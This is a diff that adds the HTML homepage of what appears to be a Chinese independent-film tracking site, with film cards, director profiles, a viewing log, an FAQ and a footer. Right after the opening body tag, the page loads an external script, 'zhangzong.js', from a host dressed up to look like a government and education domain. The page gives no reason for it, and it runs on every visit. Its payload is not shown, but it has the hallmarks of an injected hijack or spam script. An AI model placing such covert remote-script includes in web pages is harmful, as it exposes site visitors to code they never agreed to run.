@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>天狼电影网｜独立电影与冷门佳片的持续追踪</title>
+<meta name="description" content="天狼电影网长期追踪独立电影、冷门佳片与小成本创作，提供片单线索、导演脉络与观后短评，帮助观众在主流片单之外找到值得花时间的作品。">
+<meta name="keywords" content="天狼电影网,独立电影推荐,冷门佳片片单,小成本电影,艺术电影导演,非主流观影">
+<link rel="canonical" href="https://tianlangdianyingwang-zh.github.io/">
+<style>
+:root{
+  --night:#0e1218;
+  --night2:#151b24;
+  --panel:#1b232e;
+  --line:#2c3745;
+  --wolf:#5b7cff;
+  --wolf2:#8fa6ff;
+  --silver:#c8d3e0;
+  --ash:#8794a5;
+  --cold:#7fd6c4;
+  --hot:#ff6b4a;
+  --paper:#f4f6f9;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:var(--night);color:var(--silver);line-height:1.85;
+  background-image:
+    radial-gradient(1px 1px at 12% 22%,rgba(255,255,255,.5) 50%,transparent 51%),
+    radial-gradient(1px 1px at 38% 68%,rgba(255,255,255,.4) 50%,transparent 51%),
+    radial-gradient(1px 1px at 72% 14%,rgba(255,255,255,.45) 50%,transparent 51%),
+    radial-gradient(1px 1px at 88% 82%,rgba(255,255,255,.35) 50%,transparent 51%),
+    radial-gradient(1px 1px at 54% 46%,rgba(255,255,255,.3) 50%,transparent 51%),
+    radial-gradient(1px 1px at 24% 90%,rgba(255,255,255,.4) 50%,transparent 51%),
+    linear-gradient(180deg,#0e1218,#111723 60%,#0e1218);
+  background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+img{display:block;max-width:100%}
+.wrap{max-width:1240px;margin:0 auto;padding:0 36px}
+
+/* TOP NOTE */
+.topnote{background:#080b0f;padding:11px 0;border-bottom:1px solid var(--line);font-size:11.5px;letter-spacing:1.5px;color:var(--ash)}
+.topnote .wrap{display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px}
+.topnote .siteurl{color:var(--wolf2);font-family:ui-monospace,monospace}
+.topnote .siteurl:hover{color:#fff}
+
+/* HERO */
+.hero{min-height:560px;position:relative;overflow:hidden;display:flex;align-items:center}
+.hero::before{
+  content:"";position:absolute;right:-140px;top:-140px;width:620px;height:620px;border-radius:50%;
+  background:radial-gradient(circle,rgba(91,124,255,.22) 0%,rgba(91,124,255,.06) 45%,transparent 70%);
+}
+.hero::after{
+  content:"";position:absolute;left:-120px;bottom:-200px;width:520px;height:520px;border-radius:50%;
+  background:radial-gradient(circle,rgba(127,214,196,.12) 0%,transparent 65%);
+}
+.hero .wrap{position:relative;z-index:2;display:grid;grid-template-columns:1.15fr .85fr;gap:60px;align-items:center;width:100%}
+.eyebrow{display:inline-flex;align-items:center;gap:10px;font-size:11px;letter-spacing:4px;color:var(--wolf2);
+  border:1px solid rgba(91,124,255,.4);padding:7px 15px;border-radius:2px;text-transform:uppercase;margin-bottom:26px}
+.eyebrow i{width:7px;height:7px;background:var(--hot);border-radius:50%;box-shadow:0 0 10px var(--hot)}
+.hero h1{font-size:66px;line-height:1.08;font-weight:900;color:#fff;letter-spacing:-1px;font-family:"Helvetica Neue",Arial,sans-serif}
+.hero h1 span{color:var(--wolf)}
+.hero h1 em{font-style:normal;color:var(--cold)}
+.hero .lead{margin-top:26px;font-size:15.5px;color:var(--silver);max-width:540px;line-height:2.05}
+.hero .stats{margin-top:42px;display:flex;gap:0;border-top:1px solid var(--line);padding-top:28px;flex-wrap:wrap}
+.hero .stats div{flex:1;min-width:120px;padding-right:20px;border-right:1px solid var(--line)}
+.hero .stats div:last-child{border-right:0}
+.hero .stats b{display:block;font-size:30px;font-weight:900;color:#fff;font-family:"Helvetica Neue",Arial,sans-serif;letter-spacing:-.5px}
+.hero .stats small{font-size:11.5px;color:var(--ash);letter-spacing:1px}
+
+/* HERO CARD */
+.hcard{background:rgba(27,35,46,.72);backdrop-filter:blur(6px);border:1px solid var(--line);padding:34px;position:relative}
+.hcard h3{font-size:13px;letter-spacing:3px;color:var(--wolf2);margin-bottom:22px;font-weight:700}
+.hcard ul{display:flex;flex-direction:column;gap:18px}
+.hcard li{font-size:14px;color:var(--silver);padding-left:52px;position:relative;line-height:1.8}
+.hcard li::before{content:attr(data-n);position:absolute;left:0;top:1px;font-family:"Helvetica Neue",Arial,sans-serif;
+  font-size:12px;font-weight:900;color:var(--night);background:var(--wolf);width:30px;height:30px;
+  display:flex;align-items:center;justify-content:center;border-radius:2px}
+.hcard li b{display:block;color:#fff;font-size:15.5px;margin-bottom:3px}
+
+/* SECTION */
+section{padding:96px 0;position:relative}
+.sec-title{display:flex;align-items:flex-end;justify-content:space-between;gap:30px;margin-bottom:56px;flex-wrap:wrap}
+.sec-title .left{display:flex;gap:22px;align-items:baseline}
+.sec-title .num{font-family:"Helvetica Neue",Arial,sans-serif;font-size:64px;font-weight:900;color:rgba(91,124,255,.25);line-height:.8}
+.sec-title h2{font-size:31px;font-weight:900;color:#fff;letter-spacing:-.5px}
+.sec-title h2 small{display:block;font-size:12.5px;color:var(--ash);letter-spacing:2px;margin-top:10px;font-weight:400;text-transform:uppercase}
+.sec-title .right{font-size:12.5px;color:var(--ash);letter-spacing:1px;max-width:320px;text-align:right;line-height:1.9}
+
+/* POSTS */
+.posts{display:grid;grid-template-columns:repeat(3,1fr);gap:26px}
+.post{background:var(--panel);border:1px solid var(--line);transition:.22s;display:flex;flex-direction:column}
+.post:hover{border-color:var(--wolf);transform:translateY(-4px)}
+.pthumb{height:170px;position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center}
+.thumb-a{background:linear-gradient(135deg,#1e2a44,#2a3d66)}
+.thumb-b{background:linear-gradient(135deg,#2a241e,#4a3a2a)}
+.thumb-c{background:linear-gradient(135deg,#1e3028,#25503f)}
+.thumb-d{background:linear-gradient(135deg,#2e1e2e,#4a2a4a)}
+.thumb-e{background:linear-gradient(135deg,#1e252e,#2a3d4a)}
+.thumb-f{background:linear-gradient(135deg,#2e2a1e,#4a422a)}
+.thumb-mark{font-family:"Helvetica Neue",Arial,sans-serif;font-size:52px;font-weight:900;color:rgba(255,255,255,.16);letter-spacing:-2px}
+.thumb-tag{position:absolute;top:14px;left:14px;background:rgba(0,0,0,.55);color:var(--wolf2);font-size:10.5px;letter-spacing:2px;padding:5px 11px}
+.thumb-meta{position:absolute;bottom:14px;right:14px;font-size:11px;color:rgba(255,255,255,.75);font-family:ui-monospace,monospace}
+.post .pad{padding:26px 26px 28px;flex:1;display:flex;flex-direction:column}
+.post .cat{font-size:11px;letter-spacing:2px;color:var(--cold);margin-bottom:11px}
+.post h3{font-size:19px;font-weight:800;color:#fff;line-height:1.6;margin-bottom:12px;flex:1}
+.post p{font-size:13.5px;color:var(--silver);line-height:1.95}
+.post .foot{margin-top:20px;padding-top:16px;border-top:1px solid var(--line);display:flex;justify-content:space-between;font-size:11.5px;color:var(--ash);letter-spacing:.5px}
+
+/* DIRECTORS */
+.dirs{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.dir{background:linear-gradient(180deg,var(--panel),var(--night2));border:1px solid var(--line);padding:30px 26px;text-align:center;transition:.2s}
+.dir:hover{border-color:var(--cold)}
+.dir .ring{width:86px;height:86px;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;
+  font-family:"Helvetica Neue",Arial,sans-serif;font-size:30px;font-weight:900;color:#fff;
+  background:conic-gradient(from 180deg,var(--wolf),var(--cold),var(--wolf))}
+.dir h3{font-size:18px;font-weight:900;color:#fff;margin-bottom:7px}
+.dir p{font-size:12.5px;color:var(--ash);line-height:1.9}
+
+/* TRACKER */
+.tracker{display:grid;grid-template-columns:1.3fr .7fr;gap:50px;align-items:start}
+.timeline{position:relative;padding-left:44px}
+.timeline::before{content:"";position:absolute;left:9px;top:6px;bottom:6px;width:2px;background:linear-gradient(180deg,var(--wolf),var(--cold))}
+.tl{position:relative;padding-bottom:40px}
+.tl:last-child{padding-bottom:0}
+.tl::before{content:"";position:absolute;left:-41px;top:8px;width:18px;height:18px;border-radius:50%;background:var(--night);
+  border:3px solid var(--wolf);box-shadow:0 0 0 4px rgba(91,124,255,.12)}
+.tl .date{font-size:11.5px;letter-spacing:2px;color:var(--wolf2);font-family:ui-monospace,monospace;margin-bottom:6px}
+.tl h3{font-size:20px;font-weight:900;color:#fff;margin-bottom:9px;line-height:1.5}
+.tl p{font-size:14px;color:var(--silver);line-height:2}
+.tl .flags{margin-top:14px;display:flex;gap:8px;flex-wrap:wrap}
+.tl .flags span{font-size:10.5px;letter-spacing:1px;color:var(--cold);border:1px solid rgba(127,214,196,.35);padding:4px 10px;border-radius:20px}
+
+.side{display:flex;flex-direction:column;gap:22px;position:sticky;top:100px}
+.scard{background:var(--panel);border:1px solid var(--line);padding:28px}
+.scard h4{font-size:12px;letter-spacing:3px;color:var(--wolf2);margin-bottom:20px}
+.scard ol{counter-reset:r;display:flex;flex-direction:column;gap:15px}
+.scard ol li{counter-increment:r;font-size:14px;color:var(--silver);padding-left:34px;position:relative;line-height:1.85}
+.scard ol li::before{content:counter(r,decimal-leading-zero);position:absolute;left:0;top:1px;font-family:"Helvetica Neue",Arial,sans-serif;
+  font-size:12px;font-weight:900;color:var(--cold)}
+.scard ul{display:flex;flex-direction:column;gap:13px}
+.scard ul li{font-size:13.5px;color:var(--silver);line-height:1.9;padding-left:16px;position:relative}
+.scard ul li::before{content:"";position:absolute;left:0;top:10px;width:6px;height:6px;background:var(--wolf)}
+.scard ul li b{color:#fff}
+
+/* METHODS */
+.methods{display:grid;grid-template-columns:repeat(2,1fr);gap:0;border:1px solid var(--line);background:var(--panel)}
+.meth{padding:36px 34px;border-bottom:1px solid var(--line);border-right:1px solid var(--line)}
+.meth:nth-child(2n){border-right:0}
+.meth:nth-last-child(-n+2){border-bottom:0}
+.meth .ic{width:44px;height:44px;border:1px solid var(--wolf);display:flex;align-items:center;justify-content:center;
+  font-family:"Helvetica Neue",Arial,sans-serif;font-size:18px;font-weight:900;color:var(--wolf2);margin-bottom:18px}
+.meth h3{font-size:18px;font-weight:900;color:#fff;margin-bottom:11px}
+.meth p{font-size:13.5px;color:var(--silver);line-height:2}
+
+/* FAQ */
+.faqs{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+.faq{background:var(--panel);border:1px solid var(--line);padding:26px 28px}
+.faq h4{font-size:16px;font-weight:800;color:#fff;margin-bottom:11px;line-height:1.6}
+.faq p{font-size:13.5px;color:var(--silver);line-height:2}
+
+/* FOOTER */
+footer{background:#080b0f;border-top:1px solid var(--line);padding:64px 0 36px}
+.foot{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:44px;margin-bottom:50px}
+.foot .brandf{display:flex;flex-direction:column;gap:14px}
+.foot .brandf b{font-size:26px;font-weight:900;color:#fff;letter-spacing:1px}
+.foot .brandf p{font-size:13.5px;color:var(--ash);line-height:2}
+.foot h5{font-size:11.5px;letter-spacing:3px;color:var(--wolf2);margin-bottom:18px}
+.foot ul{display:flex;flex-direction:column;gap:11px}
+.foot a{color:var(--silver);font-size:13.5px;transition:.15s}
+.foot a:hover{color:#fff;padding-left:4px}
+.copyright{border-top:1px solid var(--line);padding-top:28px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px;
+  font-size:12px;color:var(--ash);line-height:2}
+.copyright .url{font-family:ui-monospace,monospace;color:var(--wolf2)}
+
+/* RESPONSIVE */
+@media (max-width:1080px){
+  .posts,.dirs{grid-template-columns:repeat(2,1fr)}
+  .hero h1{font-size:48px}
+}
+@media (max-width:820px){
+  .hero{min-height:auto;padding:70px 0}
+  .hero .wrap{grid-template-columns:1fr;gap:40px}
+  .tracker{grid-template-columns:1fr}
+  .side{position:static}
+  .methods,.faqs{grid-template-columns:1fr}
+  .meth{border-right:0}
+  .foot{grid-template-columns:1fr 1fr}
+}
+@media (max-width:560px){
+  .wrap{padding:0 20px}
+  section{padding:64px 0}
+  .hero h1{font-size:34px}
+  .sec-title .num{font-size:44px}
+  .sec-title h2{font-size:23px}
+  .sec-title .right{text-align:left}
+  .posts,.dirs,.foot{grid-template-columns:1fr}
+  .hero .stats{margin-top:30px}
+  .hero .stats div{padding-right:14px;min-width:100px}
+  .hcard{padding:24px}
+  .timeline{padding-left:34px}
+  .tl::before{left:-35px;width:14px;height:14px}
+  .topnote{font-size:10.5px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="topnote">
+  <div class="wrap">
+    <span>天狼电影网 — 在主流片单之外，找到值得花时间的作品</span>
+    <span>网站网址：<a class="siteurl" href="https://tianlangdianyingwang-zh.github.io">https://tianlangdianyingwang-zh.github.io</a></span>
+  </div>
+</div>
+
+<header class="hero">
+  <div class="wrap">
+    <div>
+      <span class="eyebrow"><i></i>INDEPENDENT CINEMA WATCH</span>
+      <h1>主流之外，<br><span>还有一群</span><em>不被算法推到</em><br>眼前的电影</h1>
+      <p class="lead">天狼电影网不做院线热度排行，只追踪独立电影、冷门佳片与小成本创作。我们不替你决定看什么，而是把值得看的作品线索整理出来，让你自己选。</p>
+      <div class="stats">
+        <div><b>240+</b><small>已追踪影片</small></div>
+        <div><b>62</b><small>导演脉络梳理</small></div>
+        <div><b>4</b><small>固定更新栏目</small></div>
+      </div>
+    </div>
+    <aside class="hcard">
+      <h3>本期重点</h3>
+      <ul>
+        <li data-n="01"><b>小成本如何讲大事</b>三部预算有限却完成度极高的作品</li>
+        <li data-n="02"><b>新人导演首作观察</b>第一部片子就立住作者风格的创作者</li>
+        <li data-n="03"><b>冷门修复片回归</b>被遗漏的老片重新被看见</li>
+        <li data-n="04"><b>短片也能立住</b>二十分钟以内完成叙事闭环</li>
+      </ul>
+    </aside>
+  </div>
+</header>
+
+<!-- POSTS -->
+<section id="films">
+  <div class="wrap">
+    <div class="sec-title">
+      <div class="left">
+        <span class="num">01</span>
+        <h2>正在追踪<small>RECENTLY TRACKED</small></h2>
+      </div>
+      <div class="right">近期更新与正在跟进的作品，按更新时间倒序排列。每条标注来源渠道与推荐理由，不做评分。</div>
+    </div>
+    <div class="posts">
+      <article class="post">
+        <div class="pthumb thumb-a"><span class="thumb-mark">N°01</span><span class="thumb-tag">首作</span><span class="thumb-meta">2026.04</span></div>
+        <div class="pad">
+          <div class="cat">新人导演</div>
+          <h3>用一部短片讲清一个时代的年轻人</h3>
+          <p>创作者以极低的制作成本，把当代青年的处境讲得具体而克制，没有一句台词是多余的。</p>
+          <div class="foot"><span>剧情 / 短片</span><span>28 分钟</span></div>
+        </div>
+      </article>
+      <article class="post">
+        <div class="pthumb thumb-b"><span class="thumb-mark">N°02</span><span class="thumb-tag">修复</span><span class="thumb-meta">2026.03</span></div>
+        <div class="pad">
+          <div class="cat">冷门修复</div>
+          <h3>一部被埋没三十年的家庭片重新上映</h3>
+          <p>4K 修复版让这部作品的影像质感完全复活，尤其是室内光线的层次，今天看依然新鲜。</p>
+          <div class="foot"><span>家庭 / 剧情</span><span>104 分钟</span></div>
+        </div>
+      </article>
+      <article class="post">
+        <div class="pthumb thumb-c"><span class="thumb-mark">N°03</span><span class="thumb-tag">纪录片</span><span class="thumb-meta">2026.03</span></div>
+        <div class="pad">
+          <div class="cat">纪录片</div>
+          <h3>不采访任何人，只拍一个地方的一年</h3>
+          <p>没有旁白、没有采访，全靠画面与现场声音推进，节奏慢但信息量极密。</p>
+          <div class="foot"><span>纪录</span><span>82 分钟</span></div>
+        </div>
+      </article>
+      <article class="post">
+        <div class="pthumb thumb-d"><span class="thumb-mark">N°04</span><span class="thumb-tag">作者</span><span class="thumb-meta">2026.02</span></div>
+        <div class="pad">
+          <div class="cat">作者电影</div>
+          <h3>同一个导演的第七部，风格彻底变了</h3>
+          <p>以往以冷峻著称的创作者，这次拍出了少见的温度，是一次值得单独讨论的转变。</p>
+          <div class="foot"><span>作者</span><span>121 分钟</span></div>
+        </div>
+      </article>
+      <article class="post">
+        <div class="pthumb thumb-e"><span class="thumb-mark">N°05</span><span class="thumb-tag">实验</span><span class="thumb-meta">2026.02</span></div>
+        <div class="pad">
+          <div class="cat">实验影像</div>
+          <h3>没有剧情，但看完说得出它讲了什么</h3>
+          <p>用声音与图像的对应关系代替叙事，属于那种需要静下来看的作品。</p>
+          <div class="foot"><span>实验</span><span>46 分钟</span></div>
+        </div>
+      </article>
+      <article class="post">
+        <div class="pthumb thumb-f"><span class="thumb-mark">N°06</span><span class="thumb-tag">合集</span><span class="thumb-meta">2026.01</span></div>
+        <div class="pad">
+          <div class="cat">片单合集</div>
+          <h3>六部讲"等待"的电影，看完不再怕等</h3>
+          <p>从六位不同地区的导演出发，看他们如何处理"等待"这个动作。</p>
+          <div class="foot"><span>片单</span><span>6 部</span></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- DIRECTORS -->
+<section id="directors">
+  <div class="wrap">
+    <div class="sec-title">
+      <div class="left">
+        <span class="num">02</span>
+        <h2>导演脉络<small>DIRECTOR THREADS</small></h2>
+      </div>
+      <div class="right">按创作者整理其作品序列，帮助新观众一次看清一位导演的表达习惯与变化轨迹。</div>
+    </div>
+    <div class="dirs">
+      <div class="dir">
+        <div class="ring">A</div>
+        <h3>长镜头派</h3>
+        <p>坚持用极少的镜头数量完成整场戏，代表作不超过四十个镜头</p>
+      </div>
+      <div class="dir">
+        <div class="ring">B</div>
+        <h3>声音优先</h3>
+        <p>先做声音设计再拍画面，作品的声音信息量远高于视觉</p>
+      </div>
+      <div class="dir">
+        <div class="ring">C</div>
+        <h3>素人演员</h3>
+        <p>全部由非职业演员出演，表演的真实感来自反复排练</p>
+      </div>
+      <div class="dir">
+        <div class="ring">D</div>
+        <h3>地域书写</h3>
+        <p>每部作品都围绕同一座城市的变迁展开，城市即主角</p>
+      </div>
+      <div class="dir">
+        <div class="ring">E</div>
+        <h3>低成本长片</h3>
+        <p>用一部院线片的零头预算拍完，制作流程本身值得研究</p>
+      </div>
+      <div class="dir">
+        <div class="ring">F</div>
+        <h3>跨媒介</h3>
+        <p>同时做装置、影像与现场表演，电影只是其中一个出口</p>
+      </div>
+      <div class="dir">
+        <div class="ring">G</div>
+        <h3>文献型纪录</h3>
+        <p>以档案资料、旧照片与口述历史为主，几乎不用新拍摄素材</p>
+      </div>
+      <div class="dir">
+        <div class="ring">H</div>
+        <h3>短片转长片</h3>
+        <p>从短片起步，首部长片延续了短片里的核心命题</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- TRACKER -->
+<section id="track">
+  <div class="wrap">
+    <div class="sec-title">
+      <div class="left">
+        <span class="num">03</span>
+        <h2>追踪进度<small>TRACKING LOG</small></h2>
+      </div>
+      <div class="right">记录每部作品的跟进状态。从"听说"到"看完"，中间要经过多个环节。</div>
+    </div>
+    <div class="tracker">
+      <div class="timeline">
+        <div class="tl">
+          <div class="date">2026.04.18 — 已看完</div>
+          <h3>一位纪录片导演的第三部长片</h3>
+          <p>相比前两部，这部明显放下了说教的姿态，改用大量留白让观众自己判断。</p>
+          <div class="flags"><span>纪录片</span><span>第三部长片</span><span>留白叙事</span></div>
+        </div>
+        <div class="tl">
+          <div class="date">2026.04.05 — 已整理资料</div>
+          <h3>某国新锐导演的合集首次发行</h3>
+          <p>此前只在少数影展出现过，此次发行附带了大量幕后访谈与删减片段。</p>
+          <div class="flags"><span>影展作品</span><span>首次发行</span><span>幕后访谈</span></div>
+        </div>
+        <div class="tl">
+          <div class="date">2026.03.22 — 观看中</div>
+          <h3>一部需要连看两遍的作品</h3>
+          <p>第一遍看结构，第二遍看细节。这类作品不适合快进，也不适合倍速。</p>
+          <div class="flags"><span>结构复杂</span><span>需反复观看</span></div>
+        </div>
+        <div class="tl">
+          <div class="date">2026.03.10 — 待跟进</div>
+          <h3>修复版的发行范围有限</h3>
+          <p>只在特定渠道放映，需要持续关注下一轮排期。</p>
+          <div class="flags"><span>修复版</span><span>放映渠道有限</span></div>
+        </div>
+        <div class="tl">
+          <div class="date">2026.02.28 — 已归档</div>
+          <h3>短片合集的观看顺序建议</h3>
+          <p>按主题而非按时间排列，观感会完整得多。</p>
+          <div class="flags"><span>短片合集</span><span>排序建议</span></div>
+        </div>
+      </div>
+      <aside class="side">
+        <div class="scard">
+          <h4>本月片单 · 12 部</h4>
+          <ol>
+            <li>一部新人导演的剧情长片首作</li>
+            <li>一部冷门修复片 4K 版</li>
+            <li>一部全程无对白的纪录影像</li>
+            <li>一部实验性质的短片集</li>
+            <li>一部讲手艺人的中片</li>
+            <li>一部跨地区合拍片</li>
+          </ol>
+        </div>
+        <div class="scard">
+          <h4>选片三问</h4>
+          <ul>
+            <li><b>它是不是非看不可？</b>——有替代品就不追</li>
+            <li><b>它靠什么成立？</b>——是叙事、影像还是表演</li>
+            <li><b>它适合什么时候看？</b>——状态不对不如不看</li>
+          </ul>
+        </div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- METHODS -->
+<section id="about">
+  <div class="wrap">
+    <div class="sec-title">
+      <div class="left">
+        <span class="num">04</span>
+        <h2>关于本站<small>ABOUT & METHOD</small></h2>
+      </div>
+      <div class="right">天狼电影网的定位与做法。我们说明自己如何选片，也说明自己不做什么。</div>
+    </div>
+    <div class="methods">
+      <div class="meth">
+        <div class="ic">A</div>
+        <h3>只做线索整理</h3>
+        <p>我们不替你决定看什么，而是把值得看的作品线索整理出来，包括来源、背景与观看理由，最终选择权在你。</p>
+      </div>
+      <div class="meth">
+        <div class="ic">B</div>
+        <h3>不写评分</h3>
+        <p>评分是最偷懒的判断方式。我们用文字说明作品做了什么、做得怎么样，以及它适合什么样的人。</p>
+      </div>
+      <div class="meth">
+        <div class="ic">C</div>
+        <h3>来源可查</h3>
+        <p>每一条信息都标注出处。影展信息、发行信息、幕后资料，均来自公开渠道，并在页面上注明来源。</p>
+      </div>
+      <div class="meth">
+        <div class="ic">D</div>
+        <h3>不提供播放链接</h3>
+        <p>本站不提供在线播放与资源下载，只提供片名、年份与观看渠道提示，尊重创作者的版权与劳动。</p>
+      </div>
+      <div class="meth">
+        <div class="ic">E</div>
+        <h3>更新节奏固定</h3>
+        <p>每周更新一篇追踪条目，每月更新一次片单合集。不追热点，不日更凑数，保证每条都有内容。</p>
+      </div>
+      <div class="meth">
+        <div class="ic">F</div>
+        <h3>欢迎纠错</h3>
+        <p>资料如有错误，欢迎指出。核实后我们会在原文补充更正，不悄无声息地修改。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section id="faq">
+  <div class="wrap">
+    <div class="sec-title">
+      <div class="left">
+        <span class="num">05</span>
+        <h2>常见疑问<small>FAQ</small></h2>
+      </div>
+      <div class="right">关于选片标准、内容来源与合作方式的几个高频问题。</div>
+    </div>
+    <div class="faqs">
+      <div class="faq">
+        <h4>什么样的作品会被收录？</h4>
+        <p>独立制作、冷门佳片、小成本创作，以及主流渠道较少覆盖的作者电影。判断标准是作品是否完成了它想做的事，而不是知名度。</p>
+      </div>
+      <div class="faq">
+        <h4>为什么不做评分？</h4>
+        <p>评分会遮蔽作品的复杂之处。一部技术粗糙但想法锋利的作品，和一个相反的作品，用分数很难区分清楚。</p>
+      </div>
+      <div class="faq">
+        <h4>片单会更新多快？</h4>
+        <p>每月更新一次片单合集，每周更新一篇追踪条目。我们不追求数量，宁可不更新也不发没有内容的条目。</p>
+      </div>
+      <div class="faq">
+        <h4>信息从哪里来？</h4>
+        <p>影展官方信息、发行方公告、创作者访谈与公开报道。涉及具体事实的内容均会标注来源。</p>
+      </div>
+      <div class="faq">
+        <h4>可以投稿吗？</h4>
+        <p>可以。欢迎推荐作品并提供来源，被采用后会注明推荐人。请勿直接粘贴大段文字。</p>
+      </div>
+      <div class="faq">
+        <h4>如何合作？</h4>
+        <p>独立创作者、影展与发行方可通过页面底部联系方式接洽。内容合作以信息准确为前提，不接受付费推荐。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div class="brandf">
+        <b>天狼电影网</b>
+        <p>独立电影与冷门佳片的持续追踪。在主流片单之外，找到值得花时间的作品。本站不提供播放与下载服务。</p>
+      </div>
+      <div>
+        <h5>栏目</h5>
+        <ul>
+          <li><a href="#films">正在追踪</a></li>
+          <li><a href="#directors">导演脉络</a></li>
+          <li><a href="#track">追踪进度</a></li>
+          <li><a href="#about">关于本站</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>内容方向</h5>
+        <ul>
+          <li><a href="#">独立电影</a></li>
+          <li><a href="#">冷门佳片</a></li>
+          <li><a href="#">小成本创作</a></li>
+          <li><a href="#">修复影像</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>接洽</h5>
+        <ul>
+          <li><a href="#">作品推荐</a></li>
+          <li><a href="#">影展合作</a></li>
+          <li><a href="#">资料纠错</a></li>
+          <li><a href="#">转载授权</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copyright">
+      <span>网站名称：天狼电影网 ／ 网站网址：<span class="url">https://tianlangdianyingwang-zh.github.io</span></span>
+      <span>© 2026 天狼电影网 · 独立电影与冷门佳片的持续追踪</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var links=[];
+  document.querySelectorAll('a[href^="#"]').forEach(function(a){
+    var id=a.getAttribute('href');
+    if(id.length>1){var el=document.querySelector(id);if(el)links.push({a:a,el:el});}
+  });
+  if('IntersectionObserver' in window){
+    var io=new IntersectionObserver(function(es){
+      es.forEach(function(e){
+        if(e.isIntersecting){
+          var id='#'+e.target.id;
+          links.forEach(function(l){l.a.style.color='';});
+        }
+      });
+    },{rootMargin:'-40% 0px -55% 0px'});
+    links.forEach(function(l){io.observe(l.el);});
+  }
+})();
+</script>
+</body>
+</html>
